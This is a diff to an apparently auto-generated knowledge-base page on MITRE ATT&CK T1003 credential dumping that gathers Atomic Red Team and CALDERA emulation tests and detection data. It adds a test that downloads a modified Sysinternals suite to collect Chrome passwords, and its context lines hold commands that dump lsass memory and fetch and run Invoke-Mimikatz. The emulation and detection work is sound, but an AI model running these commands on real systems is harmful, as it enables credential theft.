@@ -138,14 +138,20 @@ DCSync is a variation on credential dumping which can be used to acquire sensiti
 
 The /proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively. This functionality has been implemented in the [MimiPenguin](https://attack.mitre.org/software/S0179), an open source tool inspired by [Mimikatz](https://attack.mitre.org/software/S0002). The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.
 
+## Aliases
+
+```
+
+```
+
 ## Additional Attributes
 
 * Bypass: None
 * Effective Permissions: None
-* Network: intentionally left blank
+* Network: None
 * Permissions: ['Administrator', 'SYSTEM', 'root']
 * Platforms: ['Windows', 'Linux', 'macOS']
-* Remote: intentionally left blank
+* Remote: None
 * Type: attack-pattern
 * Wiki: https://attack.mitre.org/techniques/T1003
 
@@ -224,10 +230,13 @@ pypykatz live lsa
 
 pypykatz live registry
 
+Set-Location -path "$env:TEMP\Sysinternals";
+./accesschk.exe -accepteula .;
+
 {'windows': {'psh': {'command': 'Import-Module .\\PowerView.ps1 -Force;\nGet-NetComputer\n', 'payloads': ['powerview.ps1']}}}
 {'windows': {'psh': {'command': '$ps_url = "https://download.sysinternals.com/files/Procdump.zip";\n$download_folder = "C:\\Users\\Public\\";\n$staging_folder = "C:\\Users\\Public\\temp";\nStart-BitsTransfer -Source $ps_url -Destination $download_folder;\nExpand-Archive -LiteralPath $download_folder"Procdump.zip" -DestinationPath $staging_folder;\n$arch=[System.Environment]::Is64BitOperatingSystem;\n\nif ($arch) {\n    iex $staging_folder"\\procdump64.exe -accepteula -ma lsass.exe" > $env:APPDATA\\error.dmp 2>&1;\n} else {\n    iex $staging_folder"\\procdump.exe -accepteula -ma lsass.exe" > $env:APPDATA\\error.dmp 2>&1;\n}\nremove-item $staging_folder -Recurse;\n'}}}
 {'windows': {'psh': {'command': '.\\totallylegit.exe #{host.process.id} C:\\Users\\Public\\creds.dmp\n', 'payloads': ['totallylegit.exe']}}}
-{'windows': {'psh': {'command': 'Import-Module .\\invoke-mimi.ps1;\nInvoke-Mimikatz -DumpCreds\n', 'parsers': {'plugins.stockpile.app.parsers.katz': [{'source': 'domain.user.name', 'edge': 'has_password', 'target': 'domain.user.password'}, {'source': 'domain.user.name', 'edge': 'has_hash', 'target': 'domain.user.ntlm'}, {'source': 'domain.user.name', 'edge': 'has_hash', 'target': 'domain.user.sha1'}]}, 'payloads': ['invoke-mimi.ps1.xored'], 'cleanup': 'Remove-Item -Force -Path "invoke-mimi.ps1"'}}}
+{'windows': {'psh': {'command': 'Import-Module .\\invoke-mimi.ps1;\nInvoke-Mimikatz -DumpCreds\n', 'parsers': {'plugins.stockpile.app.parsers.katz': [{'source': 'domain.user.name', 'edge': 'has_password', 'target': 'domain.user.password'}, {'source': 'domain.user.name', 'edge': 'has_hash', 'target': 'domain.user.ntlm'}, {'source': 'domain.user.name', 'edge': 'has_hash', 'target': 'domain.user.sha1'}]}, 'payloads': ['invoke-mimi.ps1']}}}
 {'windows': {'psh': {'command': 'reg query HKLM /f password /t REG_SZ /s\n'}}}
 {'windows': {'psh': {'command': '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };\n$web = (New-Object System.Net.WebClient);\n$result = $web.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1");\niex $result; Invoke-Mimikatz -DumpCreds\n', 'parsers': {'plugins.stockpile.app.parsers.katz': [{'source': 'domain.user.name', 'edge': 'has_password', 'target': 'domain.user.password'}]}}}}
 ntdsutil.exe
@@ -467,6 +476,10 @@ Copyright (C) Microsoft Corporation. all rights reserved.
  {'command': 'pypykatz live registry\n',
   'name': None,
   'source': 'atomics/T1003/T1003.yaml'},
+ {'command': 'Set-Location -path "$env:TEMP\\Sysinternals";\n'
+             './accesschk.exe -accepteula .;\n',
+  'name': None,
+  'source': 'atomics/T1003/T1003.yaml'},
  {'command': {'windows': {'psh': {'command': 'Import-Module .\\PowerView.ps1 '
                                              '-Force;\n'
                                              'Get-NetComputer\n',
@@ -509,9 +522,7 @@ Copyright (C) Microsoft Corporation. all rights reserved.
                                   'payloads': ['totallylegit.exe']}}},
   'name': 'Custom GO credential dumper using minidumpwritedump',
   'source': 'data/abilities/credential-access/3c647015-ab0a-496a-8847-6ab173cd2b22.yml'},
- {'command': {'windows': {'psh': {'cleanup': 'Remove-Item -Force -Path '
-                                             '"invoke-mimi.ps1"',
-                                  'command': 'Import-Module '
+ {'command': {'windows': {'psh': {'command': 'Import-Module '
                                              '.\\invoke-mimi.ps1;\n'
                                              'Invoke-Mimikatz -DumpCreds\n',
                                   'parsers': {'plugins.stockpile.app.parsers.katz': [{'edge': 'has_password',
@@ -523,7 +534,7 @@ Copyright (C) Microsoft Corporation. all rights reserved.
                                                                                      {'edge': 'has_hash',
                                                                                       'source': 'domain.user.name',
                                                                                       'target': 'domain.user.sha1'}]},
-                                  'payloads': ['invoke-mimi.ps1.xored']}}},
+                                  'payloads': ['invoke-mimi.ps1']}}},
   'name': 'Use Invoke-Mimikatz',
   'source': 'data/abilities/credential-access/7049e3ec-b822-4fdf-a4ac-18190f9b66d1.yml'},
  {'command': {'windows': {'psh': {'command': 'reg query HKLM /f password /t '
@@ -1361,7 +1372,19 @@ Copyright (C) Microsoft Corporation. all rights reserved.
                   'status': 'experimental',
                   'tags': ['attack.credential_access', 'attack.t1003'],
                   'title': 'Activity Related to NTDS.dit Domain Hash '
-                           'Retrieval'}}]
+                           'Retrieval'}},
+ {'data_source': ['4688', 'Process Execution']},
+ {'data_source': ['4688 ', 'Process CMD Line']},
+ {'data_source': ['200-500', ' 4100-4104', 'PowerShell logs']},
+ {'data_source': ['Other Event IDs']},
+ {'data_source': ['Memory Forensics']},
+ {'data_source': ['API monitoring']},
+ {'data_source': ['4688', 'Process Execution']},
+ {'data_source': ['4688 ', 'Process CMD Line']},
+ {'data_source': ['200-500', ' 4100-4104', 'PowerShell logs']},
+ {'data_source': ['Other Event IDs']},
+ {'data_source': ['Memory Forensics']},
+ {'data_source': ['API monitoring']}]
 ```
 
 ## Potential Queries
@@ -1775,7 +1798,8 @@ Copyright (C) Microsoft Corporation. all rights reserved.
                                                                 'msv\n'
                                                                 'kerberos\n'
                                                                 'logonpasswords'}},
- {'Atomic Red Team Test - Credential Dumping': {'atomic_tests': [{'description': 'Dumps '
+ {'Atomic Red Team Test - Credential Dumping': {'atomic_tests': [{'auto_generated_guid': '66fb0bc1-3c3f-47e9-a298-550ecfefacbc',
+                                                                  'description': 'Dumps '
                                                                                  'credentials '
                                                                                  'from '
                                                                                  'memory '
@@ -1868,7 +1892,8 @@ Copyright (C) Microsoft Corporation. all rights reserved.
                                                                   'name': 'Powershell '
                                                                           'Mimikatz',
                                                                   'supported_platforms': ['windows']},
-                                                                 {'dependencies': [{'description': 'Gsecdump '
+                                                                 {'auto_generated_guid': '96345bfc-8ae7-4b6a-80b7-223200f24ef9',
+                                                                  'dependencies': [{'description': 'Gsecdump '
                                                                                                    'must '
                                                                                                    'exist '
                                                                                                    'on '
@@ -2018,7 +2043,8 @@ Copyright (C) Microsoft Corporation. all rights reserved.
                                                                                                        'type': 'url'}},
                                                                   'name': 'Gsecdump',
                                                                   'supported_platforms': ['windows']},
-                                                                 {'dependencies': [{'description': 'Windows '
+                                                                 {'auto_generated_guid': '0f7c5301-6859-45ba-8b4d-1fac30fc31ed',
+                                                                  'dependencies': [{'description': 'Windows '
                                                                                                    'Credential '
                                                                                                    'Editor '
                                                                                                    'must '
@@ -2193,7 +2219,8 @@ Copyright (C) Microsoft Corporation. all rights reserved.
                                                                           'Credential '
                                                                           'Editor',
                                                                   'supported_platforms': ['windows']},
-                                                                 {'description': 'Local '
+                                                                 {'auto_generated_guid': '5c2571d0-1572-416d-9676-812e64ca9f44',
+                                                                  'description': 'Local '
                                                                                  'SAM '
                                                                                  '(SAM '
                                                                                  '& '
@@ -2279,7 +2306,8 @@ Copyright (C) Microsoft Corporation. all rights reserved.
                                                                           'and '
                                                                           'secrets',
                                                                   'supported_platforms': ['windows']},
-                                                                 {'dependencies': [{'description': 'ProcDump '
+                                                                 {'auto_generated_guid': '0be2230c-9ab3-4ac2-8826-3199b9a0ebf8',
+                                                                  'dependencies': [{'description': 'ProcDump '
                                                                                                    'tool '
                                                                                                    'from '
                                                                                                    'Sysinternals '
@@ -2413,7 +2441,8 @@ Copyright (C) Microsoft Corporation. all rights reserved.
                                                                           'using '
                                                                           'ProcDump',
                                                                   'supported_platforms': ['windows']},
-                                                                 {'description': 'The '
+                                                                 {'auto_generated_guid': '2536dee2-12fb-459a-8c37-971844fa73be',
+                                                                  'description': 'The '
                                                                                  'memory '
                                                                                  'of '
                                                                                  'lsass.exe '
@@ -2464,7 +2493,8 @@ Copyright (C) Microsoft Corporation. all rights reserved.
                                                                           'using '
                                                                           'comsvcs.dll',
                                                                   'supported_platforms': ['windows']},
-                                                                 {'dependencies': [{'description': 'Dumpert '
+                                                                 {'auto_generated_guid': '7ae7102c-a099-45c8-b985-4c7a2d05790d',
+                                                                  'dependencies': [{'description': 'Dumpert '
                                                                                                    'executable '
                                                                                                    'must '
                                                                                                    'exist '
@@ -2585,7 +2615,8 @@ Copyright (C) Microsoft Corporation. all rights reserved.
                                                                           'API '
                                                                           'unhooking',
                                                                   'supported_platforms': ['windows']},
-                                                                 {'description': 'The '
+                                                                 {'auto_generated_guid': 'dea6c349-f1c6-44f3-87a1-1ed33a59a607',
+                                                                  'description': 'The '
                                                                                  'memory '
                                                                                  'of '
                                                                                  'lsass.exe '
@@ -2709,7 +2740,8 @@ Copyright (C) Microsoft Corporation. all rights reserved.
                                                                           'Task '
                                                                           'Manager',
                                                                   'supported_platforms': ['windows']},
-                                                                 {'dependencies': [{'description': 'Mimikatz '
+                                                                 {'auto_generated_guid': '453acf13-1dbd-47d7-b28a-172ce9228023',
+                                                                  'dependencies': [{'description': 'Mimikatz '
                                                                                                    'must '
                                                                                                    'exist '
                                                                                                    'on '
@@ -2845,7 +2877,8 @@ Copyright (C) Microsoft Corporation. all rights reserved.
                                                                           'With '
                                                                           'Mimikatz',
                                                                   'supported_platforms': ['windows']},
-                                                                 {'dependencies': [{'description': 'Target '
+                                                                 {'auto_generated_guid': '2364e33d-ceab-4641-8468-bfb1d7cc2723',
+                                                                  'dependencies': [{'description': 'Target '
                                                                                                    'must '
                                                                                                    'be '
                                                                                                    'a '
@@ -2972,7 +3005,8 @@ Copyright (C) Microsoft Corporation. all rights reserved.
                                                                           'with '
                                                                           'NTDSUtil',
                                                                   'supported_platforms': ['windows']},
-                                                                 {'dependencies': [{'description': 'Target '
+                                                                 {'auto_generated_guid': 'dcebead7-6c28-4b4b-bf3c-79deb1b1fc7f',
+                                                                  'dependencies': [{'description': 'Target '
                                                                                                    'must '
                                                                                                    'be '
                                                                                                    'a '
@@ -3049,7 +3083,8 @@ Copyright (C) Microsoft Corporation. all rights reserved.
                                                                           'with '
                                                                           'NTDS.dit',
                                                                   'supported_platforms': ['windows']},
-                                                                 {'dependencies': [{'description': 'Target '
+                                                                 {'auto_generated_guid': 'c6237146-9ea6-4711-85c9-c56d263a6b03',
+                                                                  'dependencies': [{'description': 'Target '
                                                                                                    'must '
                                                                                                    'be '
                                                                                                    'a '
@@ -3228,7 +3263,8 @@ Copyright (C) Microsoft Corporation. all rights reserved.
                                                                           'Shadow '
                                                                           'Copy',
                                                                   'supported_platforms': ['windows']},
-                                                                 {'dependencies': [{'description': 'Computer '
+                                                                 {'auto_generated_guid': '870fe8fb-5e23-4f5f-b89d-dd7fe26f3b5f',
+                                                                  'dependencies': [{'description': 'Computer '
                                                                                                    'must '
                                                                                                    'be '
                                                                                                    'domain '
@@ -3288,7 +3324,8 @@ Copyright (C) Microsoft Corporation. all rights reserved.
                                                                           'Passwords '
                                                                           '(findstr)',
                                                                   'supported_platforms': ['windows']},
-                                                                 {'dependencies': [{'description': 'Get-GPPPassword '
+                                                                 {'auto_generated_guid': 'e9584f82-322c-474a-b831-940fd8b4455c',
+                                                                  'dependencies': [{'description': 'Get-GPPPassword '
                                                                                                    'PowerShell '
                                                                                                    'Script '
                                                                                                    'must '
@@ -3432,7 +3469,8 @@ Copyright (C) Microsoft Corporation. all rights reserved.
                                                                           'Passwords '
                                                                           '(Get-GPPPassword)',
                                                                   'supported_platforms': ['windows']},
-                                                                 {'dependencies': [{'description': 'Computer '
+                                                                 {'auto_generated_guid': 'c37bc535-5c62-4195-9cc3-0517673171d8',
+                                                                  'dependencies': [{'description': 'Computer '
                                                                                                    'must '
                                                                                                    'have '
                                                                                                    'python '
@@ -3549,7 +3587,8 @@ Copyright (C) Microsoft Corporation. all rights reserved.
                                                                           'with '
                                                                           'pypykatz',
                                                                   'supported_platforms': ['windows']},
-                                                                 {'dependencies': [{'description': 'Computer '
+                                                                 {'auto_generated_guid': 'a96872b2-cbf3-46cf-8eb4-27e8c0e85263',
+                                                                  'dependencies': [{'description': 'Computer '
                                                                                                    'must '
                                                                                                    'have '
                                                                                                    'python '
@@ -3627,6 +3666,116 @@ Copyright (C) Microsoft Corporation. all rights reserved.
                                                                           'parse '
                                                                           'with '
                                                                           'pypykatz',
+                                                                  'supported_platforms': ['windows']},
+                                                                 {'auto_generated_guid': '8c05b133-d438-47ca-a630-19cc464c4622',
+                                                                  'dependencies': [{'description': 'Modified '
+                                                                                                   'Sysinternals '
+                                                                                                   'must '
+                                                                                                   'be '
+                                                                                                   'located '
+                                                                                                   'at '
+                                                                                                   '#{file_path}\n',
+                                                                                    'get_prereq_command': 'Invoke-WebRequest '
+                                                                                                          '"https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip" '
+                                                                                                          '-OutFile '
+                                                                                                          '"#{file_path}\\Modified-SysInternalsSuite.zip"\n'
+                                                                                                          'Expand-Archive '
+                                                                                                          '#{file_path}\\Modified-SysInternalsSuite.zip '
+                                                                                                          '#{file_path}\\sysinternals '
+                                                                                                          '-Force\n'
+                                                                                                          'Remove-Item '
+                                                                                                          '#{file_path}\\Modified-SysInternalsSuite.zip '
+                                                                                                          '-Force\n',
+                                                                                    'prereq_command': 'if '
+                                                                                                      '(Test-Path '
+                                                                                                      '#{file_path}\\SysInternals) '
+                                                                                                      '{exit '
+                                                                                                      '0} '
+                                                                                                      'else '
+                                                                                                      '{exit '
+                                                                                                      '1}\n'}],
+                                                                  'dependency_executor_name': 'powershell',
+                                                                  'description': 'A '
+                                                                                 'modified '
+                                                                                 'sysinternals '
+                                                                                 'suite '
+                                                                                 'will '
+                                                                                 'be '
+                                                                                 'downloaded '
+                                                                                 'and '
+                                                                                 'staged. '
+                                                                                 'The '
+                                                                                 'Chrome-password '
+                                                                                 'collector, '
+                                                                                 'renamed '
+                                                                                 'accesschk.exe, '
+                                                                                 'will '
+                                                                                 'then '
+                                                                                 'be '
+                                                                                 'executed '
+                                                                                 'from '
+                                                                                 '#{file_path}.\n'
+                                                                                 '\n'
+                                                                                 'Successful '
+                                                                                 'execution '
+                                                                                 'will '
+                                                                                 'produce '
+                                                                                 'stdout '
+                                                                                 'message '
+                                                                                 'stating '
+                                                                                 '"Copying '
+                                                                                 'db '
+                                                                                 '... '
+                                                                                 'passwordsDB '
+                                                                                 'DB '
+                                                                                 'Opened. '
+                                                                                 'statement '
+                                                                                 'prepare '
+                                                                                 'DB '
+                                                                                 'connection '
+                                                                                 'closed '
+                                                                                 'properly". '
+                                                                                 'Upon '
+                                                                                 'completion, '
+                                                                                 'final '
+                                                                                 'output '
+                                                                                 'will '
+                                                                                 'be '
+                                                                                 'a '
+                                                                                 'file '
+                                                                                 'modification '
+                                                                                 'of '
+                                                                                 '$env:TEMP\\sysinternals\\passwordsdb.\n'
+                                                                                 '\n'
+                                                                                 'Adapted '
+                                                                                 'from '
+                                                                                 '[MITRE '
+                                                                                 'ATTACK '
+                                                                                 'Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)\n',
+                                                                  'executor': {'cleanup_command': 'Remove-Item '
+                                                                                                  '#{file_path}\\Sysinternals '
+                                                                                                  '-Force '
+                                                                                                  '-Recurse '
+                                                                                                  '-ErrorAction '
+                                                                                                  'Ignore',
+                                                                               'command': 'Set-Location '
+                                                                                          '-path '
+                                                                                          '"#{file_path}\\Sysinternals";\n'
+                                                                                          './accesschk.exe '
+                                                                                          '-accepteula '
+                                                                                          '.;\n',
+                                                                               'elevation_required': False,
+                                                                               'name': 'powershell'},
+                                                                  'input_arguments': {'file_path': {'default': '$env:TEMP',
+                                                                                                    'description': 'File '
+                                                                                                                   'path '
+                                                                                                                   'for '
+                                                                                                                   'modified '
+                                                                                                                   'Sysinternals',
+                                                                                                    'type': 'String'}},
+                                                                  'name': 'Run '
+                                                                          'Chrome-password '
+                                                                          'Collector',
                                                                   'supported_platforms': ['windows']}],
                                                 'attack_technique': 'T1003',
                                                 'display_name': 'Credential '
@@ -3740,11 +3889,7 @@ Copyright (C) Microsoft Corporation. all rights reserved.
                                                            'Invoke-Mimikatz',
                                             'id': '7049e3ec-b822-4fdf-a4ac-18190f9b66d1',
                                             'name': 'Powerkatz (Staged)',
-                                            'platforms': {'windows': {'psh': {'cleanup': 'Remove-Item '
-                                                                                         '-Force '
-                                                                                         '-Path '
-                                                                                         '"invoke-mimi.ps1"',
-                                                                              'command': 'Import-Module '
+                                            'platforms': {'windows': {'psh': {'command': 'Import-Module '
                                                                                          '.\\invoke-mimi.ps1;\n'
                                                                                          'Invoke-Mimikatz '
                                                                                          '-DumpCreds\n',
@@ -3757,7 +3902,7 @@ Copyright (C) Microsoft Corporation. all rights reserved.
                                                                                                                                  {'edge': 'has_hash',
                                                                                                                                   'source': 'domain.user.name',
                                                                                                                                   'target': 'domain.user.sha1'}]},
-                                                                              'payloads': ['invoke-mimi.ps1.xored']}}},
+                                                                              'payloads': ['invoke-mimi.ps1']}}},
                                             'privilege': 'Elevated',
                                             'tactic': 'credential-access',
                                             'technique': {'attack_id': 'T1003',
